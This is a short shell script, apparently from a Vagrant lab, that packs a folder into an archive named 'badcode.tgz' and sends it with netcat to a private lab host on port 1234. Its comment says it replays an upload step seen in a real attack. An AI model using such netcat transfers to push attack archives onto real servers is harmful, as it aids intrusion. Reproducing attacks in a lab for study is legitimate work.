#!/bin/sh

##############################################################
# NETCAT file transfer to "direct report upload" as found on the website during last attack
# Ing. Alexander Poschenreithner, 2017
##############################################################

# https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/

# Delete badcode.tgz if it already exists
if [ -f '/vagrant_data/badcode.tgz' ]
then
	echo "     => Removing old badcode.tgz"
	rm /vagrant_data/badcode.tgz
fi

echo "     => Creating tgz from /share/netcat_file_content..."
env GZIP=-9 tar cvzf /vagrant_data/badcode.tgz -C /vagrant_data/netcat_file_content/ .
echo "     => Sending file over netcat on port 1234 to Server"
nc -w 3 10.11.12.10 1234 < /vagrant_data/badcode.tgz
echo "     => Sent!"
